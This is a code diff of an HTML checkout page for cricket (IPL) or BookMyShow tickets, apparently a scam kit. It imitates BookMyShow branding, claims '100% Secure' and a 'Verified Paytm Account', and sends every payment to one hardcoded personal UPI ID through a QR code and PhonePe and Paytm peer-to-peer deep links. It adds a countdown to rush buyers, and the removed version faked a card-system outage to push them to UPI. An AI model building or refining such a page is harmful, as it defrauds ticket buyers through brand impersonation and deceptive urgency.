@@ -1,145 +1,302 @@
-<!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
+    <link rel="icon" type="image/svg+xml" href="/vite.svg">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Secure Checkout - TATA IPL</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
-        body { font-family: 'Inter', sans-serif; background: #f0f4f8; margin: 0; padding: 15px; text-align: center; color: #1e293b; }
-        
-        .checkout-card { background: #fff; max-width: 400px; margin: auto; border-radius: 28px; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; }
-        
-        /* Header Section */
-        .header { background: linear-gradient(135deg, #0052FF 0%, #0036b3 100%); color: #fff; padding: 25px; position: relative; }
-        .amount-tag { font-size: 36px; font-weight: 800; display: block; margin-top: 5px; letter-spacing: -1px; }
-        
-        .qr-container { padding: 20px; background: #fafafa; border-bottom: 1px solid #eee; }
-        .qr-frame { background: #fff; padding: 10px; border-radius: 20px; border: 1px solid #edf2f7; display: inline-block; }
-        #qr-code { width: 180px; height: 180px; display: block; border-radius: 12px; }
+    <title>Vite + React - Secure Payment</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <script type="module" src="assets/index-ck3X7H0s.js"></script>
+    <link rel="stylesheet" href="assets/index-DOFwVbkK.css">
 
-        /* Payment Buttons Grid */
-        .payment-methods { padding: 25px 20px; text-align: left; }
-        .method-title { font-size: 14px; font-weight: 700; color: #64748b; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 0.5px; }
-        
-        .pay-btn { display: flex; align-items: center; justify-content: space-between; width: 100%; padding: 16px; border-radius: 15px; border: 1px solid #e2e8f0; background: #fff; margin-bottom: 12px; cursor: pointer; transition: 0.3s; text-decoration: none; }
-        .pay-btn:hover { border-color: #0052FF; background: #f8fbff; }
-        
-        .btn-left { display: flex; align-items: center; gap: 12px; }
-        .btn-left img { width: 32px; height: 32px; object-fit: contain; }
-        .btn-left span { font-weight: 700; font-size: 15px; color: #1e293b; }
-        .arrow-right { color: #cbd5e1; font-weight: bold; }
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style jsx="true">
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
 
-        /* Highlighted Button */
-        .any-upi { background: #111827; border: none; }
-        .any-upi span { color: #fff !important; }
+        body {
+            font-family: 'Inter', sans-serif;
+            -webkit-tap-highlight-color: transparent; /* Mobile par click highlight hatane ke liye */
+        }
 
-        .card-btn { background: #f1f5f9; border: 1px dashed #cbd5e1; }
+        .payment-option {
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .payment-option:hover {
+            background-color: #f8fafc;
+            transform: translateY(-1px);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .payment-option.active {
+            border-color: #4f46e5;
+            background-color: #f5f3ff;
+            box-shadow: 0 0 0 2px #e0e7ff;
+        }
+
+        .qr-code-container {
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .payment-icon {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .accordion-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            display: none;
+        }
+
+        .accordion-content.open {
+            max-height: 2000px;
+            display: block;
+            padding: 0;
+            background: #f9f9f9;
+            border-radius: 5px;
+        }
+
+        .payment-logo {
+            max-height: 28px;
+            object-fit: contain;
+            filter: grayscale(0.2);
+        }
+
+        .glassmorphism {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .payment-method-container {
+            transition: all 0.5s ease;
+        }
+
+        .payment-method-container:hover {
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+
+        /* Mobile specific adjustments */
+        @media (max-width: 480px) {
+            .upi-id-container {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .upi-text {
+                max-width: 100%;
+                text-align: center;
+                font-size: 0.9rem;
+                padding: 6px 0;
+                word-break: break-all; /* Lamba UPI ID tootne se bachaega */
+            }
+            
+            #qr-code-img {
+                min-width: 150px !important;
+                min-height: 150px !important;
+                max-width: 100%;
+            }
+        }
     </style>
 </head>
+
 <body>
-
-    <div class="checkout-card">
-        <div class="header">
-            <span style="font-size: 12px; opacity: 0.8; font-weight: 700; letter-spacing: 1px;">TOTAL PAYABLE</span>
-            <span class="amount-tag" id="main-amt">₹0</span>
-        </div>
-
-        <div class="qr-container">
-            <p style="font-size: 12px; color: #64748b; margin-top: 0; font-weight: 600;">Scan QR to Pay</p>
-            <div class="qr-frame"><img id="qr-code" src="" alt="UPI QR"></div>
-        </div>
-
-        <div class="payment-methods">
-            <div class="method-title">Fast Checkout</div>
-
-            <a href="#" id="gpay-link" class="pay-btn">
-                <div class="btn-left">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/f2/Google_Pay_Logo.svg" style="height:24px; width:32px; object-fit:contain;">
-                    <span>Pay with GPay</span>
-                </div>
-                <div class="arrow-right">›</div>
-            </a>
+    <div id="root">
+        <div class="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 pb-20 md:pb-0">
             
-            <a href="#" id="phonepe-link" class="pay-btn">
-                <div class="btn-left">
-                    <img src="https://cdn.razorpay.com/app/phonepe.svg">
-                    <span>Pay with PhonePe</span>
+            <header class="glassmorphism sticky top-0 z-50 py-3 px-3 sm:px-6 flex justify-between items-center shadow-sm">
+                <div class="flex items-center space-x-2 sm:space-x-4">
+                    <button class="hover:bg-gray-100 p-1.5 sm:p-2 rounded-full transition-all" aria-label="Go back">
+                        <i class="fas fa-arrow-left text-gray-600 text-sm sm:text-base"></i>
+                    </button>
+                    <img alt="BookMyShow" class="h-6 sm:h-8 hover:opacity-90 transition-opacity" src="https://getlogo.net/wp-content/uploads/2020/04/bookmyshow-logo-vector-xs.png">
+                    <div class="hidden sm:block h-6 w-px bg-gray-200"></div>
+                    <span class="hidden sm:inline text-sm font-medium text-gray-600">Secure Checkout</span>
                 </div>
-                <div class="arrow-right">›</div>
-            </a>
+                <div class="flex items-center space-x-1 sm:space-x-2 bg-green-50 px-2 sm:px-3 py-1 sm:py-1.5 rounded-full border border-green-100">
+                    <i class="fas fa-shield-alt text-green-600 text-xs sm:text-sm"></i>
+                    <span class="text-[10px] sm:text-sm font-medium text-green-700">100% Secure</span>
+                </div>
+            </header>
 
-            <a href="#" id="paytm-link" class="pay-btn">
-                <div class="btn-left">
-                    <img src="https://cdn.razorpay.com/app/paytm.svg">
-                    <span>Pay with Paytm</span>
-                </div>
-                <div class="arrow-right">›</div>
-            </a>
+            <div class="container mx-auto py-4 px-3 sm:px-4 md:px-6">
+                <div class="flex flex-col md:flex-row gap-6 max-w-4xl mx-auto">
+                    
+                    <div class="w-full md:w-full">
+                        <div class="bg-white rounded-xl shadow-sm overflow-hidden border border-gray-100 payment-method-container">
+                            
+                            <div class="p-4 sm:p-6 border-b border-gray-100">
+                                <h2 class="text-lg sm:text-xl font-semibold text-gray-800">Choose Payment Method</h2>
+                                <p class="text-xs sm:text-sm text-gray-500 mt-1">All transactions are secure and encrypted</p>
+                            </div>
+                            
+                            <div class="p-3 sm:p-4 border-b border-gray-100">
+                                <button class="w-full text-left py-2 px-2 rounded-lg payment-option active">
+                                    <div class="flex items-center justify-between w-full">
+                                        <div class="flex items-center">
+                                            <div class="payment-icon bg-green-100 rounded-full p-2 mr-3">
+                                                <i class="fa-solid fa-qrcode text-green-600"></i>
+                                            </div>
+                                            <span class="font-medium text-sm sm:text-base mr-2">UPI/QR</span>
+                                            <img alt="UPI Payment Options" class="payment-logo hidden sm:block" src="https://shopindiaonline.in/wp-content/uploads/2023/09/payment-logo-icons-1024x272-1.png">
+                                        </div>
+                                        <i class="fa-solid fa-chevron-up text-gray-600"></i>
+                                    </div>
+                                </button>
 
-            <a href="#" id="universal-link" class="pay-btn any-upi">
-                <div class="btn-left">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" style="filter: brightness(0) invert(1);">
-                    <span>Pay with Any UPI App</span>
-                </div>
-                <div class="arrow-right" style="color:#fff">›</div>
-            </a>
+                                <div class="accordion-content open w-full">
+                                    <div class="mt-3 p-3 sm:p-5 border border-gray-200 rounded-xl bg-gradient-to-b from-white to-gray-50">
+                                        <div class="qr-code-container text-center">
+                                            
+                                            <div class="mb-4">
+                                                <div class="text-xs sm:text-sm font-medium text-gray-700 mb-2">
+                                                    Scan the QR within <span id="countdown" class="text-red-600 font-bold">15:00</span>
+                                                </div>
 
-            <div class="method-title" style="margin-top: 20px;">Other Options</div>
-            
-            <div class="pay-btn card-btn" onclick="alert('Card system is under maintenance. Please use UPI.')">
-                <div class="btn-left">
-                    <img src="https://img.icons8.com/color/48/000000/visa.png" style="width:24px;">
-                    <img src="https://img.icons8.com/color/48/000000/mastercard.png" style="width:24px;">
-                    <span>Credit / Debit Cards</span>
+                                                <div class="mb-4 bg-white p-3 sm:p-4 rounded-xl border border-gray-100 shadow-sm">
+                                                    <p class="text-xs sm:text-sm font-medium text-gray-700 mb-2">UPI ID</p>
+                                                    <div class="upi-id-container flex flex-col sm:flex-row items-center justify-center gap-2 sm:gap-3 flex-wrap">
+                                                        <input type="hidden" id="upiID" value="">
+                                                        <span id="upi-text" class="text-gray-800 font-medium text-sm sm:text-base bg-gray-50 px-3 py-1 rounded w-full sm:w-auto break-all">Loading...</span>
+                                                        <button type="button" onclick="copyUpi()" class="w-full sm:w-auto text-blue-600 bg-blue-50 border border-blue-100 text-xs sm:text-sm font-semibold px-4 py-1.5 rounded-lg hover:bg-blue-100 transition-colors">
+                                                            <i class="fa-regular fa-copy mr-1"></i> Copy
+                                                        </button>
+                                                    </div>
+                                                    <p class="text-xs sm:text-sm text-gray-500 mt-3">Amount to pay: <span class="font-bold text-gray-800 text-sm sm:text-base final_paid_price">₹0</span></p>
+                                                </div>
+                                            </div>
+
+                                            <div class="relative inline-block bg-white p-2 rounded-xl shadow-sm border border-gray-100">
+                                                <img id="qr-code-img" alt="Payment QR Code" class="mx-auto rounded-lg" src="" style="width: 100%; max-width: 180px; height: auto; aspect-ratio: 1/1;">
+                                            </div>
+
+                                            <div class="mt-3 text-xs sm:text-sm font-medium text-gray-500">Scan the QR using any UPI App</div>
+
+                                            <div class="flex justify-center gap-8 sm:gap-10 mt-6">
+                                                <a id="phonepe-link" href="#" class="upi-app-link flex flex-col items-center hover:opacity-80 transition-opacity">
+                                                    <img alt="PhonePe" class="w-12 h-12 sm:w-14 sm:h-14 object-contain drop-shadow-sm" src="https://cdn.razorpay.com/app/phonepe.svg">
+                                                    <span class="text-[11px] sm:text-xs font-medium mt-2 text-gray-600">PhonePe</span>
+                                                </a>
+                                                <a id="paytm-link" href="#" class="upi-app-link flex flex-col items-center hover:opacity-80 transition-opacity">
+                                                    <img alt="Paytm" class="w-12 h-12 sm:w-14 sm:h-14 object-contain drop-shadow-sm" src="https://cdn.razorpay.com/app/paytm.svg">
+                                                    <span class="text-[11px] sm:text-xs font-medium mt-2 text-gray-600">Paytm</span>
+                                                </a>
+                                            </div>
+                                            
+                                            <p id="redirect-countdown" class="text-xs sm:text-sm text-indigo-600 font-medium mt-4 text-center"></p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                        </div>
+                    </div>
+                    
                 </div>
-                <div class="arrow-right">›</div>
             </div>
         </div>
     </div>
 
-    <script type="module">
-        import { db, ref, onValue } from "./js/firebase.js";
+    <script>
+        (function() {
+            const pageAmount = parseInt(localStorage.getItem("selectedTotalPrice")) || 0;
+            const priceDisplays = document.querySelectorAll('.final_paid_price');
+            priceDisplays.forEach(el => el.innerText = '₹' + pageAmount);
 
-        // 1. Data load from LocalStorage
-        const price = localStorage.getItem('finalPrice') || localStorage.getItem('selectedTotalPrice') || 0;
-        const name = localStorage.getItem('customerName') || "User";
-        document.getElementById('main-amt').innerText = "₹" + price;
+            let paymentUrls = { phonepe: "", paytm: "", gpay: "", qr: "" };
 
-        // 2. Fetch Admin Settings from Firebase (Catterick Style)
-        onValue(ref(db, 'settings/payment'), (snap) => {
-            if (snap.exists()) {
-                const data = snap.val();
-                const upiId = data.upiId || "paytm.s1h6t6g@pty";
-                const customQR = data.qrUrl || "";
-
-                // QR Logic
-                const note = encodeURIComponent("IPL Ticket for " + name);
-                const baseUPI = `upi://pay?pa=${upiId}&pn=IPLBooking&am=${price}&cu=INR&tn=${note}`;
+            async function updateUPIUrls(amount) {
+                amount = amount || pageAmount;
                 
-                // Set QR Image (Use Admin URL if exists, else auto-generate)
-                document.getElementById('qr-code').src = customQR ? customQR : `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(baseUPI)}`;
+                let upiId = "paytm.s1h6t6g@pty";
+                let pn = "Paytm";
+                let tn = "Verified Paytm Account";
+                let tr = "";
 
-                // --- 📱 Deep Linking Apps ---
+                const upiTextEl = document.getElementById("upi-text");
+                const upiIdInput = document.getElementById("upiID");
+
+                if (upiIdInput) upiIdInput.value = upiId;
+                if (upiTextEl) upiTextEl.innerText = upiId;
+
+                if (amount > 0) {
+                    const upiPayUrl = "upi://pay?pa=" + encodeURIComponent(upiId) + "&pn=" + encodeURIComponent(pn) + "&am=" + amount + "&cu=INR&tn=" + encodeURIComponent(tn);
+                    
+                    const qrImg = document.getElementById("qr-code-img");
+                    if (qrImg) {
+                        qrImg.src = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(upiPayUrl);
+                    }
+                    paymentUrls.qr = upiPayUrl;
+                }
+
+                const phonepePayload = {
+                    contact: { cbcName: "", nickName: "", vpa: upiId, type: "VPA" },
+                    p2pPaymentCheckoutParams: {
+                        note: tn,
+                        isByDefaultKnownContact: true,
+                        initialAmount: Number(amount) * 100,
+                        currency: "INR",
+                        checkoutType: "DEFAULT",
+                        transactionContext: "p2p"
+                    }
+                };
+                const phonepeBase64 = encodeURIComponent(btoa(JSON.stringify(phonepePayload)));
+                paymentUrls.phonepe = "phonepe://native?data=" + phonepeBase64 + "&id=p2ppayment";
+                paymentUrls.paytm = "paytmmp://cash_wallet?pa=" + encodeURIComponent(upiId) + "&pn=" + encodeURIComponent(pn) + "&am=" + amount + "&cu=INR&tn=" + encodeURIComponent(tn) + "&featuretype=money_transfer";
+
+                const phonepeLink = document.getElementById("phonepe-link");
+                const paytmLink = document.getElementById("paytm-link");
                 
-                // Universal UPI (Any App)
-                document.getElementById('universal-link').href = baseUPI;
-
-                // 🟢 Google Pay Direct
-                document.getElementById('gpay-link').href = `tez://upi/pay?pa=${upiId}&pn=IPLBooking&am=${price}&cu=INR&tn=${note}`;
-
-                // 🟢 PhonePe Direct (Fixed scanner issue, acts like Google Pay now)
-                document.getElementById('phonepe-link').href = `phonepe://pay?pa=${upiId}&pn=IPLBooking&am=${price}&cu=INR&tn=${note}`;
-
-                // Paytm Direct
-                document.getElementById('paytm-link').href = `paytmmp://cash_wallet?pa=${upiId}&pn=Booking&am=${price}&cu=INR&tn=${note}&featuretype=money_transfer`;
-
-                // Auto Redirect after 5 seconds to PhonePe (Optional, aap hata bhi sakte hain)
-                setTimeout(() => {
-                    // window.location.href = baseUPI; 
-                }, 5000);
+                if (phonepeLink) phonepeLink.href = paymentUrls.phonepe;
+                if (paytmLink) paytmLink.href = paymentUrls.paytm;
             }
-        });
+
+            updateUPIUrls();
+
+            window.startPhonePeRedirect = function() {
+                var redirectEl = document.getElementById("redirect-countdown");
+                if (!redirectEl || !paymentUrls.phonepe) return;
+                redirectEl.innerText = "Redirecting to Payment App...";
+                window.location.href = paymentUrls.phonepe; 
+            };
+        })();
+
+        function copyUpi() {
+            const copyText = document.getElementById("upiID");
+            const btn = event.currentTarget; // Copy button change effect
+            
+            if(copyText && copyText.value) {
+                navigator.clipboard.writeText(copyText.value).then(() => {
+                    const originalText = btn.innerHTML;
+                    btn.innerHTML = '<i class="fa-solid fa-check mr-1"></i> Copied!';
+                    btn.classList.add('bg-green-100', 'text-green-700', 'border-green-200');
+                    btn.classList.remove('bg-blue-50', 'text-blue-600', 'border-blue-100');
+                    
+                    setTimeout(() => {
+                        btn.innerHTML = originalText;
+                        btn.classList.remove('bg-green-100', 'text-green-700', 'border-green-200');
+                        btn.classList.add('bg-blue-50', 'text-blue-600', 'border-blue-100');
+                    }, 2000);
+                }).catch(err => {
+                    console.error('Failed to copy: ', err);
+                });
+            }
+        }
     </script>
 </body>
 </html>
